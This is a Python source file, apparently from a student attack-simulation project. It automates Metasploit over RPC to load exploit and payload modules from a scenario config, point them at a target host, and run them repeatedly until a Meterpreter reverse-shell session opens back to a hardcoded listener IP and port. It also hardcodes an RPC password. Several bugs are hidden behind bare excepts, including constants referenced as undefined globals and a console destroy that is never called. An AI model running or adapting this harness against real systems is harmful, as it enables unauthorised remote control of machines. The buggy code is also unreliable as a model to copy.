from pymetasploit3.msfconsole import MsfRpcConsole
from pymetasploit3.msfrpc import MsfRpcClient
import time
import collections
import threading


class MetasploitEnv(object):
    LHOST = "115.186.176.141"
    RHOST = "172.28.128.3"
    LPORT = "4444"

    def __init__(self, **kwargs):

        self.ConnectionMade = True
        self.client = None
        self.exploit = None
        self.payload = None
        self.conf = None
        self.attacks = {}
        self.in_progress_scenario = None
        self.SESSION_ID = None
        self.SESSION = None
        self.ptions = {}
        self.cid = 0
        self.shell = None

        self.in_progress_scenario = kwargs["in_prg_scenario"]
        self.attacks = kwargs["attks"]
        self.conf = kwargs["conf_obj"]
        self.script_delay = self.scriptDelay = int(self.conf.get_attack_options("script_delay"))

    def connectMetasploit(self):
        try:

            self.client = MsfRpcClient('FYPmsf', port=55552)
            self.ConnectionMade = True
        except:
            print("Connection Error: Please check Metasploit connection")
            self.ConnectionMade = False

    # todo: for setOptions we can set the variables (Like LHOST etc) on program start. (I think done in configuration class)
    def initialMetasploit(self):

        self.SetMetasploitEnv()

        if (not self.ConnectionMade):
            return
       
        
        else:
            self.thread_check = self.attacks[self.in_progress_scenario]
            if("separate-thread" in self.thread_check and  self.thread_check["separate-thread"]=="yes"):
                    print("Starting Another Thread")
                    self.metsploit_thread = threading.Thread(
                         target=self.control_handler, name="metasploit-thread")
                    self.metsploit_thread.start()
                    time.sleep(self.script_delay)
            else:
                self.control_handler()
        

    def control_handler(self):
        self.loop = True
        while (self.loop):

            self.loop = False
            print("....................Executing Exploit....................\n")
            self.SESSION = self.exploit.execute(payload=self.payload)
            print(self.SESSION)
            self.loop = self.MetasploitShellHandling()

        print("....................Meterpreter Session List....................\n")
        print(self.client.sessions.list)
        print("\n....................Connected Meterpreter Session Id: " +
                self.SESSION_ID + "....................\n")
        self.shell = self.client.sessions.session(self.SESSION_ID)

    def setModule(self, mType, mName):

        if (mType == 'exploit'):
            self.exploit = self.client.modules.use(mType, mName)
            return

        if (mType == 'payload'):
            self.payload = self.client.modules.use(mType, mName)
            return

    def setExploitOptions(self):
        for opt in self.options:
            if opt == 'RHOSTS':
                try:
                    self.exploit['RHOSTS'] = RHOST
                except:
                    print("exploit['RHOSTS'] not needed...")

            elif opt == 'LHOST':
                try:
                    self.exploit['LHOST'] = LHOST
                except:
                    print("exploit['LHOST'] not needed...")

            elif opt == 'LPORT':
                try:
                    self.exploit['LPORT'] = LPORT
                except:
                    print("exploit['LPORT'] not needed...")

            elif opt == 'RPORT':
                try:
                    self.exploit['RPORT'] = self.options[opt]
                except:
                    print("exploit['LPORT'] not needed...")

            elif opt == 'TARGETURI':
                try:
                    self.exploit['TARGETURI'] = self.options[opt]
                except:
                    print("exploit['TARGETURI'] not needed...")

            elif opt == 'SESSION':
                try:
                    self.exploit['SESSION'] = self.SESSION_ID
                except:
                    print("exploit['SESSION'] not needed...")

            else:
                print("option not found in exploits")

    def setPayloadOptions(self):

        for opt in self.options:

            if opt == 'LHOST':
                try:
                    self.payload['LHOST'] = LHOST
                except:
                    print("payload['LHOST'] not needed...")

            elif opt == 'LPORT':
                try:
                    self.payload['LPORT'] = LPORT
                except:
                    print("payload['LPORT'] not needed...")

            else:
                print("option not found in payloads")

    def SetMetasploitEnv(self):

        self.connectMetasploit()
        if (not self.ConnectionMade):
            return
        try:
            self.setModule(
                'exploit', self.attacks[self.in_progress_scenario]['exploit'])
        except:
            print("exploit not needed")
        try:
            self.setModule(
                'payload', self.attacks[self.in_progress_scenario]['payload'])
        except:
            print("payload not needed")
        try:
            self.options = self.attacks[self.in_progress_scenario]['options']
            self.setExploitOptions()
            self.setPayloadOptions()
        except:
            print("no options required")

        self.cid = self.client.consoles.console().cid
        print("cid: "+self.cid)

    def MetasploitShellHandling(self):
        count = 0

        while(True):
            if(not self.client.sessions.list):      # if sessions are empty
                    print("Meterpreter Sessions list empty: " +
                          str(self.client.sessions.list))

            else:                                   # is session is not empty, then find appropriate session
                for sess_keys in self.client.sessions.list:

                    if (self.client.sessions.list[sess_keys]['exploit_uuid'] == self.SESSION['uuid']):
                        self.SESSION_ID = sess_keys
                        print("Meterpreter Session found in list! ")
                        return False

                    else:
                        print(
                            "Meterpreter Session not found in list! connecting to ghost Session")
                        self.Ordered_Sessions_list = collections.OrderedDict(
                            self.client.sessions.list)
                        self.SESSION_ID = list(
                            self.Ordered_Sessions_list.keys())[-1]
                        return False

            time.sleep(3)
            count += 1
            if (count >= 5):
                print(
                    "....................Executing Exploit again....................\n")
                return True

    def DestroyEnv(self):
        print("....................Destroying Session....................\n")
        try:
            self.shell.detach()
            time.sleep(5)
            self.shell.stop()
            time.sleep(5)
            self.client.consoles.console(self.cid).destroy
        except:
            print(
                "....................No Session available to destroy....................\n")


# if __name__ = "__main__":
#     self.metasploitObj = MetasploitEnv(
#                 in_prg_scenario=self.in_progress_scenario, attks=self.attack)
#     self.metasploitObj.initialMetasploit()